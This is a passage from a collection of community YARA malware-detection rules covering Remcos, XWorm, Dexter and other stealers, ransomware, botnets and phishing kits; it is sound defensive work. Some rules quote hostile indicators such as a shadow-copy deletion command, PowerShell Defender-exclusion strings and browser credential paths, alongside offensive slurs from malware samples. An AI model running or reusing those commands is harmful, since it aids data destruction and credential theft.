		$s3 = " BreakingSecurity.net" ascii

	condition:
		(
			(all of ($r*)) or (all of ($s*))
		)
}


// ===== Source: yaraify-rules/PaaS_SpearPhishing_Feb23.yar =====
rule PaaS_SpearPhishing_Feb23
{

    meta:
	author = "Alexander Hatala (@AlexanderHatala)"
	description = "Detects targeted spear phishing campaigns using a private PaaS based on filenames."
	date = "2023-02-11"
	tlp = "CLEAR"
	yarahub_reference_md5 = "084b4397d2c3590155fed50f0ad9afcf"
	yarahub_uuid = "2c4733fc-3ec7-45db-adae-1a396ba8d4ae"
	yarahub_license = "CC BY 4.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"
	yarahub_author_twitter = "@AlexanderHatala"

    strings:
        $file1 = "saved_resource.html"
        $file2 = "/antibots7/"
        $file3 = "infos.php"
        $file4 = "config00.php"
        $file5 = "config0.php"
        $file6 = "personal.php"
        $file7 = "Email.php"
        
    condition:
        all of them
}


// ===== Source: yaraify-rules/botnet_dedsec.yar =====
rule botnet_dedsec {
    meta:
        author = "NDA0E"
        date = "2024-07-22"
	description = "dedsec botnet"
        yarahub_uuid = "9f39c4f3-7329-4de7-bff9-811bb8bfc49d"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6dde652b28f73f978e834412b835a740"
    strings:
	$dedsec = "dedsecrunsyoulilassnigga" ascii
    condition: 
	uint16(0) == 0x457f and all of them
}


// ===== Source: yaraify-rules/APT_Bitter_PDB_Paths.yar =====
rule APT_Bitter_PDB_Paths {
    
    meta:
        description = "Detects Bitter (T-APT-17) PDB Paths"
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        tlp = "WHITE"
        yarahub_uuid = "1f78e5ba-4c6c-4f14-9f43-78936d0ab687"
        yarahub_reference_md5 = "71e1cfb5e5a515cea2c3537b78325abf"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"
        reference = "https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh"
        date = "2022-06-22"
        hash0 = "55901c2d5489d6ac5a0671971d29a31f4cdfa2e03d56e18c1585d78547a26396"

    strings:
        // Almond RAT
        $pdbPath0 = "C:\\Users\\Window 10 C\\Desktop\\COMPLETED WORK\\" ascii
        $pdbPath1 = "stdrcl\\stdrcl\\obj\\Release\\stdrcl.pdb"

        // found by Qi Anxin Threat Intellingence Center
        // reference: https://mp.weixin.qq.com/s/8j_rHA7gdMxY1_X8alj8Zg
        $pdbPath2 = "g:\\Projects\\cn_stinker_34318\\"
        $pdbPath3 = "renewedstink\\renewedstink\\obj\\Release\\stimulies.pdb"

    condition:
        uint16(0) == 0x5a4d
        and any of ($pdbPath*)
}


// ===== Source: yaraify-rules/MaksStealer.yar =====
rule MaksStealer {
  meta:
    author = "ShadowOpCode"
    description = "Detects MaksStealer main payload"
    last_modified = "2025-05-18"
    date = "2025-08-19"
    yarahub_uuid = "686f9629-f84e-4cff-aebc-3a2a2d9e075d"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "00000000000000000000000000000000"

  strings:
    $sig = "HellomynameisMaxIm17IlovemakingRAT" ascii
    $sig2 = "Max/Maxt" ascii

  condition:
    $sig or $sig2
}


// ===== Source: yaraify-rules/Detect_Go_GOMAXPROCS.yar =====
rule Detect_Go_GOMAXPROCS
{
    meta:
        author                       = "Obscurity Labs LLC"
        description                  = "Detects Go binaries by the presence of runtime.GOMAXPROCS in the runtime metadata"
        version                      = "1.0.0"
        date                         = "2025-06-05"
        yarahub_author_twitter       = "@obscuritylabs"
        yarahub_reference_md5        = "7ff72f21d83d3abdc706781fb3224111"
        yarahub_uuid                 = "90626ac0-e544-4d5b-b8c3-e70a7feb2b68"
        yarahub_license              = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp    = "TLP:WHITE"
        yarahub_rule_sharing_tlp     = "TLP:WHITE"

    strings:
        $gomax = "runtime.GOMAXPROCS" ascii

    condition:
        $gomax
}


// ===== Source: yaraify-rules/PureCryptCMD.yar =====
rule PureCryptCMD
{
    meta:
        description = "Detects PureCrypters .cmd output"
        author = "01Xyris"
        date = "2024-10-15"
        yarahub_uuid = "2302a4a9-610d-424c-a67a-d0a021e08a17"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "e895debe62e7a70683da3407a24990c5"

    strings:
        $chcp_cmd = "@chcp 65001"
        $var1 = "C:\\Win"
        $var2 = "erShel"
        $var3 = "\\Wind"
        $var4 = "owsPow"
        $var5 = "shell."
        $var6 = "/q /y"
        $var7 = "l\\v1.0"
        $var8 = "/h /i"
        $var9 = "exe %~0.Kkm"
        $var10 = "ysWOW6"
        $var11 = "| xco"
        $var12 = "echo F"
        $var13 = "py /d"
        $var14 = "attrib"
        $var15 = "+s +h"
        $var16 = "SET Yi"
        $var17 = "pdqois"
        $var18 = "m.Conv"
        $var19 = "ession"
        $var20 = "ject S"

    condition:
        $chcp_cmd and all of ($var1, $var2, $var3, $var4, $var5) and 5 of ($var6, $var7, $var8, $var9, $var10, $var11, $var12, $var13, $var14, $var15, $var16, $var17, $var18, $var19, $var20)
}


// ===== Source: yaraify-rules/mal_strings_xwormRAT.yar =====
rule mal_strings_xwormRAT
{
    meta:
        author = "m4nbat"
        description = "rule designed to match strings cvommonly associated with the XWorm RAT"
        status = "experimental"
        date = "2024-04-30"
        yarahub_author_twitter = "@knappresearchlb"
        yarahub_reference_md5 = "6b438a52d60887a534e6e38f72ededff"
        sha256 = "e761f2d9049734373c12c97aa557183081403e792b40028c410e4a6c0646c2b8"
        yarahub_uuid = "78ef8d56-538d-4990-a42d-5fac4f9315a2"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.xworm"
    strings:
        $str = "pL8W93lpOxCMdF9oyd51SA==" ascii wide nocase
        $str2 = "duRbxJbQYQN8i0MjbaAeEw==" ascii wide nocase
        $ua1 = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1" ascii wide nocase
        $ua2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" ascii wide nocase
        $http1 = "Content-length: 5235" ascii wide nocase
        $http2 = "POST / HTTP/1.1" ascii wide nocase
        $http3 = "http://ip-api.com/line/?fields=hosting" ascii wide nocase
        $persist1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii wide nocase
        $ps1 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess" ascii wide nocase
        $ps2 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath" ascii wide nocase
        $ps3 = "-ExecutionPolicy Bypass -File" ascii wide nocase
        $ps4 = "powershell.exe" ascii wide nocase
        $enum1 = "SELECT * FROM Win32_VideoController" ascii wide nocase
        $enum2 = "Select * from Win32_ComputerSystem" ascii wide nocase
        $enum3 = "Select * from AntivirusProduct" ascii wide nocase
    condition:
        all of ($str*) and 
        all of ($ua*) and
        all of ($http*) and
        $persist1 and 
        all of ($ps*) and
        all of ($enum*)

        }


// ===== Source: yaraify-rules/RAT_remcos_strings.yar =====
rule RAT_remcos_strings {
   meta:
      description = "This rule detects the remcos through your specific strings."
      author = "0x0d4y"
      reference = "Internal Research"
      date = "2024-06-26"
      score = 100
      yarahub_uuid = "33e2fa3c-67d1-43dd-9d62-50efa02aa9b2"
      yarahub_reference_md5 = "69c95c878aa933bc20078fab85281fd5"
      yarahub_license = "CC BY 4.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.remcos"
   strings:
      $string1 = "Remcos_Mutex_Inj" wide ascii 
      $string2 = "autopswdata" wide ascii
      $string3 = "startcamcap" wide ascii
      $string4 = "1.7 Pro" wide ascii
      $string5 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" wide ascii
      $string6 = "Connected to C&C!\n" wide ascii
      $string7 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies" wide ascii
      $string8 = "initfun" wide ascii
      $string9 = "keyinput" wide ascii
      $string10 = "deletefile" wide ascii
      $string11 = "getcamlib" wide ascii
      $string12 = "screenshotdata" wide ascii
      $string13 = "prockill" wide ascii
      $string14 = "proclist" wide ascii
      $string15 = "upload" wide ascii
      $string16 = "download" wide ascii
      $string17 = "getdrives" wide ascii
      $string18 = "uploadprogress" wide ascii
      $string19 = "remscriptsuccess" wide ascii
      $string20 = "Breaking-Security" wide ascii
      $string21 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" wide ascii
   condition:
      uint16(0) == 0x5a4d and
      15 of ($string*)
}


// ===== Source: yaraify-rules/win_dexter_generic.yar =====
rule win_dexter_generic {
    meta:
        author = "dubfib"
        date = "2025-02-08"
        malpedia_family = "win.dexter"

        yarahub_uuid = "6a8945cf-d271-463d-b42d-e6932f3edc8e"
        yarahub_reference_md5 = "7d08306e5a837245c3f343c73535afef"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_license = "CC BY 4.0"
        yarahub_reference_link = "https://github.com/dubfib/yara"

    strings:
        $str0 = "Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)" fullword ascii
        $str1 = "WindowsResilienceServiceMutex" fullword ascii
        $str2 = "UpdateMutex:" fullword ascii
        $str3 = "NoProcess" fullword ascii
        $str4 = "gateway.php" fullword ascii
        $str5 = "/portal1/gateway.php" fullword ascii
        $str6 = "images/logo/header.php" fullword ascii
        $str7 = "SecureDll.dll" fullword ascii
        $str8 = "wuauclt.exe" fullword ascii
        $str9 = "wmiprvse.exe" fullword ascii
        $str10 = "alg.exe" fullword ascii
        $str11 = "C:\\Program Files\\Internet Explorer\\iexplore.exe" fullword wide
        $str12 = ".DEFAULT\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" fullword ascii
        $str13 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations" fullword ascii
        $str14 = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0" fullword ascii

    condition:
        uint16(0) == 0x5a4d and 
        5 of ($str*)
}


// ===== Source: yaraify-rules/smokedham.yar =====
rule smokedham {
  meta:
    date = "2025-05-12"
    target_entity = "file"
    yarahub_uuid = "c7c26314-8191-4b7b-bc0e-6eee0df7c5e3"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
    yarahub_reference_md5 = "c609dba29f9702442a0185576b777de3"
  strings:
    $string1 = "Microsoft\\WindowsUpdate24" wide ascii
    $string2 = "Microsoft\\LogUpdateWindows" wide ascii
    $string3 = "Microsoft\\UpdateDesktop\\UnicodeData" wide ascii
    $string4 = "$var4 = $var4_part0 + $var4_part1" wide ascii
  condition:
    any of them
}


// ===== Source: yaraify-rules/RobotDropper.yar =====
rule RobotDropper {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-08-29"
        description = "Detects RobotDropper"
        yarahub_uuid = "0c9b4d1c-fa9e-4435-a7bb-954e7dd6d796"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "f89109ce397d50081ea28f31a8f61952"
        
    strings:   
        $MSI = "ProductCode" ascii
        $MSI2 = "ProductVersion" ascii
        
        $CustomAction = "CustomActionData" ascii
        $ButtonPressed = "BTN_PRESSED" ascii
        $RAR_Extraction = ".rar\" \"[APPDIR]\"" ascii
	$c2Path = "licenseUser.php" ascii

    condition:
        5 of them
}


// ===== Source: yaraify-rules/test_Malaysia.yar =====
rule test_Malaysia {
    meta:
        author = "rectifyq"
        yarahub_author_twitter = "@_rectifyq"
        date = "2024-09-06"
        description = "Detects file containing malaysia string"
        yarahub_uuid = "e33a3467-675f-48b0-b491-951d3b537b9b"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "3F0E49C46CBDE0C7ADF5EA04A97AB261"
    
    strings:
        $malaysia = "malaysia" nocase
        $domain = "com.my" nocase
        
    condition:
        any of them
}


// ===== Source: yaraify-rules/Ransom_newRaaS.yar =====
rule Ransom_newRaaS : Ransomware
{
    meta:
        name                        = "Ransom_newRaaS"
        category                    = "Ransomware"
        description                 = "NewbirthRaas_ransomware"
        author                      = "Valton Tahiri"
        created                     = "2025-10-21"
        date                        = "2025-10-21"
        tlp                         = "TLP:white"
        reliability                 = 75
        sample                      = "a0d98d2b8035b3ecc4d0c51736c73e7a62ae95d5f31ca7b21c128d44256cb7b4"
        yarahub_uuid                = "14b84c9c-12f9-40e5-b4eb-9fc33b6c35b1"
        yarahub_license             = "CC0 1.0"
        yarahub_rule_matching_tlp  = "TLP:WHITE"
        yarahub_rule_sharing_tlp   = "TLP:WHITE"
        yarahub_reference_md5      = "c928aed48047cec64495d7d1daf21dc2"

    strings:
        $s1 = "cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \"ID='%s'\" delete" wide
        $s2 = "-net requires at least -nethost, -netuser, -netpass, -netdomain" wide
        $s3 = "Processes to kill:\n" wide

    condition:
        2 of them
}


// ===== Source: yaraify-rules/Detect_PyInstaller.yar =====
rule Detect_PyInstaller : PyInstaller
{
    meta:
        author                       = "Obscurity Labs LLC"
        description                  = "Detects PyInstaller compiled executables across platforms"
        date                         = "2025-06-06"
        version                      = "1.0.0"
        yarahub_author_twitter       = "@obscuritylabs"
        yarahub_reference_md5        = "8f1c4e4a402a65f0fbe470ba0bd58bdd"
        yarahub_uuid                 = "90626ac0-e544-4d5b-b8c3-e70a7feb2b73"
        yarahub_license              = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp    = "TLP:WHITE"
        yarahub_rule_sharing_tlp     = "TLP:WHITE"
        mitre_attack_tactic          = "T1027.002"
        mitre_attack_technique       = "TA0005"

    strings:
        // PyInstaller specific strings
        // _MEIPASS2 dates back to 2005 and seems to be cross-platform
        // https://github.com/pyinstaller/pyinstaller/blob/v1.0/source/windows/winmain.c#L123
        $meipass2      = "_MEIPASS2"         nocase wide ascii
        $pyi_runtime   = "PyInstaller"       nocase wide ascii
        
        // Common PyInstaller file patterns
        $pyi_prefix   = "pyi-"               nocase wide ascii
        $pyi_prexix2  = "Py_"               nocase wide ascii
        
        // Python runtime indicators
        $python_dll   = "python"             nocase wide ascii
        $py_import    = "PyImport_"          nocase wide ascii

    condition:
        // Must have at least one PyInstaller specific string
        any of ($meipass2, $pyi_runtime) and
        // And at least one of the following
        (
            // Either PyInstaller archive/manifest
            any of ($pyi_prefix, $pyi_prexix2)
            or
            // Or Python runtime indicators
            (any of ($python_dll) and any of ($py_import))
        )
}


// ===== Source: yaraify-rules/botnet_Yakuza.yar =====
rule botnet_Yakuza {
    meta:
        author = "NDA0E"
        date = "2024-07-22"
	description = "Yakuza botnet"
        yarahub_uuid = "c0ed7b7d-f8f5-4301-812d-aaca80577c97"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6dde652b28f73f978e834412b835a740"
    strings:
	$yakuza = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
	$YakuzaBotnet = "YakuzaBotnet" ascii
    condition: 
	uint16(0) == 0x457f and any of them
}